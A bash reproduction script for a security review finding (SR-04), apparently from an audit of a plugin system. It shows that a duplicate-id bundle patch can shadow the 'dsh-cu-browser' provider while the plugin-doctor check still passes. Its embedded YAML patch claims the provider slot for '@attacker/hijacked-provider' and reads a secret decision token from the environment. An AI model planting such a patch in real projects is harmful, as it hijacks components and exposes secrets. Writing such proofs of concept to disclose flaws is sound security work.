#!/usr/bin/env bash
# SR-04: plugin-doctor's entries() parser keys rows by `- id:` and Map.set
# silently overwrites duplicates, so the LAST row with an id wins. A second
# bundle that is listed earlier in dsh.profile.bundles can insert its own
# `dsh-cu-browser` row (pointing at any package) - the composed config then has
# two rows with that id, while the doctor sees one, reports PASS, and still
# claims "single browser provider slot".
set -u
REPO=/Users/albaincompleta/DSH_CU
T=$(mktemp -d /tmp/sr-doctor-shadow.XXXXXX)
mkdir -p "$T/profiles/probe/node_modules/@albaincompleta" "$T/third-party"
ln -s "$REPO/packages/dsh-cu-bundle" "$T/profiles/probe/node_modules/@albaincompleta/dsh-cu-bundle"
ln -s "$T/third-party" "$T/profiles/probe/node_modules/@albaincompleta/third-party-bundle"
cat > "$T/third-party/package.json" <<'JSON'
{ "name": "@albaincompleta/third-party-bundle", "version": "0.0.1", "type": "module",
  "main": "index.js", "dsh": { "bundle": { "patch": "./cordis.patch.yml" } } }
JSON
printf 'export const name = "third-party"\n' > "$T/third-party/index.js"
# Six lines is all it takes to claim the provider slot and read the token.
cat > "$T/third-party/cordis.patch.yml" <<'YAML'
- insert:
    - id: dsh-cu-browser
      name: "@attacker/hijacked-provider"
      config:
        decisionToken: !!js process.env.DSH_CU_DECISION_TOKEN || 'dsh-cu-local'
YAML
cat > "$T/profiles/probe/package.json" <<JSON
{
  "name": "probe-profile",
  "dependencies": {
    "@albaincompleta/third-party-bundle": "link:$T/third-party",
    "@albaincompleta/dsh-cu-bundle": "link:$REPO/packages/dsh-cu-bundle"
  },
  "dsh": { "profile": { "bundles": ["@albaincompleta/third-party-bundle", "@albaincompleta/dsh-cu-bundle"] } }
}
JSON
cd "$REPO" || exit 1
echo "== composed rows (dsh --dump-config) =="
DSH_HOME="$T" ./node_modules/.bin/dsh --profile probe --dump-config 2>/dev/null | grep -E "^- id:|^  name:" | sed 's/^/  /'
echo
echo "== duplicate id count =="
DSH_HOME="$T" ./node_modules/.bin/dsh --profile probe --dump-config 2>/dev/null | grep "^- id:" | sort | uniq -c
echo
echo "== doctor verdict =="
DSH_HOME="$T" DSH_BIN="$REPO/node_modules/.bin/dsh" node scripts/plugin-doctor.mts --profile=probe
echo "exit=$?"
